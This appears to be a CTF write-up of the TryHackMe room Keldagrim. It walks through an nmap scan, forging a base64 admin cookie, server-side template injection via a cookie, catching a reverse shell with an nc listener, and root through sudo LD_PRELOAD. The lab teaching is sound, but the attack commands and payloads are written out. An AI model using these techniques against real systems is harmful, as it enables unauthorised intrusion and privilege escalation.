---
layout: post
current: post
cover: 'assets/images/keldagrim/cover.png'
navigation: True
title: "Keldagrim Write Up"
date: 2021-03-06 00:00:00
tags: [tryhackme, ctf, medium]
class: post-template
subclass: 'post'
author: darryn
---
![keldagrim](/assets/images/keldagrim/cover.png)

### Overview

[Keldagrim](https://tryhackme.com/room/keldagrim) is a medium level CTF room on [TryHackMe](https://tryhackme.com) created by [Optional](https://twitter.com/optionalctf).

> Can you overcome the forge and steal all of the gold!

### Nmap

I deployed the machine and was given the target IP 10.10.252.142 I started a nmap scan to check the available ports. 

```highlight
└──╼ $sudo nmap -sC -sV -oN nmap/initial 10.10.252.142
Starting Nmap 7.80 ( https://nmap.org ) at 2021-03-06 13:03 GMT
Nmap scan report for 10.10.252.142
Host is up (0.030s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 d8:23:24:3c:6e:3f:5b:b0:ec:42:e4:ce:71:2f:1e:52 (RSA)
|   256 c6:75:e5:10:b4:0a:51:83:3e:55:b4:f6:03:b5:0b:7a (ECDSA)
|_  256 4c:51:80:db:31:4c:6a:be:bf:9b:48:b5:d4:d6:ff:7c (ED25519)
80/tcp open  http    Werkzeug httpd 1.0.1 (Python 3.6.9)
| http-cookie-flags: 
|   /: 
|     session: 
|_      httponly flag not set
|_http-server-header: Werkzeug/1.0.1 Python/3.6.9
|_http-title:  Home page 
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.63 seconds
```

2 Ports open:

- 22 - SSH - Banner is showing its an Ubuntu machine
- 80 - HTTP - Werkzeug httpd 1.0.1

I also ran a full port scan but no additional ports were found.

### Enumeration

I opened up my browser and started to have a look at the web page.

![webpage](/assets/images/keldagrim/webpage.png)

Nothing really stood out however when I looked at the source code I could see a disabled link to /admin

```highlight
    <li class="nav-item dropdown">
        <a class="nav-link dropdown-toggle" href="#" id="navbarDropdown" role="button" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
          Buy Gold
        </a>
        <div class="dropdown-menu" aria-labelledby="navbarDropdown">
            <a class="dropdown-item" href="/wow">World of Warcraft</a>
            <a class="dropdown-item" href="/OSRunescape">Old School Runescape</a>
            <a class="dropdown-item" href="/runescape">Runescape3</a>
          <div class="dropdown-divider"></div>
          <a class="dropdown-item " href="/admin">Admin</a>
        </div>
      </li>
</ul>
```

However the page looks pretty much the same. So I looked at cookies and found a session cooke with a base64 value.

![guest](/assets/images/keldagrim/guest.png)

There are lots of ways to change the base64 to plaintext but I really like [CyberChef](https://gchq.github.io/CyberChef/) at the moment. Using CyberChef I was able to see the value was 'guest'.

![cyberchef](/assets/images/keldagrim/cyberchef.png)

I used CyberChef again to encode 'admin' in to base64.

![adminhash](/assets/images/keldagrim/adminhash.png)

Simply changing the session cookie value to the base64 output and refreshing the page now allowed me to see - 'Current user - $2,165' and be provided with a sales cookie.

![sales](/assets/images/keldagrim/sales.png)

This was also base64 encoded, CyberChef has a great feature called 'Magic', if you are unsure how something is encoded use magic to suggest and test various operations.

![saleshash](/assets/images/keldagrim/saleshash.png)

This next bit took some time, I was able to base64 a string and input it in to the sales cookie and it would be displayed on the webpage, however I was unsure how I would be able to use this to get a foothold on the box. After some googling, I tried a technique called Server Side Template Injection (SSTI). This was not something I had tried to exploit before so I did some research on the technique to try and understand it and used [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection) to see if I was on the right track. 

I found a payload {{7*'7'}} and if I had SSTI that should result in 7777777. I encoded the payload in base64 and updated the sales cookie with the output. 

![sstipayload](/assets/images/keldagrim/sstipayload.png)

Refreshed the page and confirmed I had SSTI in the sales cookie!

![ssti](/assets/images/keldagrim/ssti.png)

### Initial Access

On the same [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection) page was an example for remote code execution. I took the example for exploiting an SSTI by calling Popen without guessing the offset, changed the IP and port values and encoded again with base64.

I opened a nc listener and updated the sales cookie with the base64 output and got a shell!

```highlight
└──╼ $nc -nvlp 4444
listening on [any] 4444 ...
connect to [10.8.21.217] from (UNKNOWN) [10.10.252.142] 36928
/bin/sh: 0: can't access tty; job control turned off
$ whoami
jed
$ 
```

### Priv Esc

Now to get root i checked 'sudo -l'.

```highlight
$ sudo -l
Matching Defaults entries for jed on keldagrim:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, env_keep+=LD_PRELOAD

User jed may run the following commands on keldagrim:
    (ALL : ALL) NOPASSWD: /bin/ps
```

I had a look at [GTFOBins](https://gtfobins.github.io/) for '/bin/ps' but as expected I didn't find anything, I also noticed 'env_keep+=LD_PRELOAD'. There is a great course by [Heath Adams](https://twitter.com/thecybermentor) on [udemy](https://www.udemy.com/course/linux-privilege-escalation-for-beginners) for Linux privesc techinques and this is covered as part of the course. There is also a great [article](https://touhidshaikh.com/blog/2018/04/12/sudo-ld_preload-linux-privilege-escalation/) which covers it.

I used the steps in the article to create a file called evil.c, compiled with GCC. Ran the sudo command with LD_PRELOAD and got root!

```highlight
jed@keldagrim:/dev/shm$ sudo LD_PRELOAD=/dev/shm/evil.so ps
root@keldagrim:/dev/shm# id
uid=0(root) gid=0(root) groups=0(root)
root@keldagrim:/dev/shm# 
```

Thanks for reading!
